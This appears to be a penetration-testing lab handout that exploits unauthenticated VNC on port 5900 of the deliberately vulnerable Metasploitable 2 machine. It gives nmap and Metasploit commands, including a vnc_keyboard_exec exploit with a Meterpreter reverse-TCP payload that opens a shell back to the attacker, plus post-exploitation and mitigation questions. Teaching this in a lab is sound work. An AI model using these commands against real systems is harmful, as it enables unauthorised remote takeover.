# Task: Exploiting VNC Service on Metasploitable 2 (Port 5900)

### Learning Objectives

By the end of this exercise, students will be able to:

* Perform service enumeration on a target system.
* Identify the VNC service running on port `5900`.
* Use Metasploit to exploit weak authentication in VNC.
* Gain a remote shell session on Metasploitable 2.
* Understand the importance of secure configurations for remote desktop services.



### Background

Metasploitable 2 is an intentionally vulnerable Linux machine used for penetration testing practice. One of its services, **VNC (Virtual Network Computing)**, is exposed on port **5900**. VNC allows remote desktop access, but if misconfigured (like using weak authentication), attackers can gain control of the system.



### Lab Requirements

* Kali Linux (Attacker)
* Metasploitable 2 (Target)
* Both machines on the same network (e.g., VirtualBox/VMware Host-only or NAT network).



### Step 1: Reconnaissance with Nmap

Scan Metasploitable to find open ports:

```bash
nmap -sV -p 5900 <target_ip>
```

* `-sV` → Detect service version
* `-p 5900` → Scan only the VNC port

👉 Expected Output:
Shows `5900/tcp open vnc`.



### Step 2: Search for Vulnerabilities in Metasploit

Start Metasploit:

```bash
msfconsole
```

Search for VNC-related exploits:

```bash
search vnc
```

👉 You should find modules like:

* `auxiliary/scanner/vnc/vnc_none_auth`
* `exploit/multi/vnc/vnc_keyboard_exec`



### Step 3: Use the VNC Authentication Bypass Module

Select the module:

```bash
use auxiliary/scanner/vnc/vnc_none_auth
```

Set target IP:

```bash
set RHOSTS <target_ip>
run
```

👉 If vulnerable, it confirms **no authentication is required**.



### Step 4: Exploit and Gain Access

Now, attempt to interact with the session:

```bash
use exploit/multi/vnc/vnc_keyboard_exec
set RHOST <target_ip>
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <your_kali_ip>
exploit
```

👉 Expected Result:
You get a **Meterpreter session** or a remote shell on Metasploitable.



### Step 5: Post-Exploitation

Once inside:

```bash
shell
whoami
uname -a
```

* Confirm you have remote access.
* Enumerate the system.


### Step 6: Discussion / Mitigation

* Why is running VNC without authentication dangerous?
* How should VNC be secured? (passwords, encryption, network restrictions, VPNs).



###  Deliverables for Students

* Nmap scan result screenshot.
* Proof of successful VNC exploitation (shell access).
* Short write-up: *“How could this vulnerability be prevented in a real system?”*
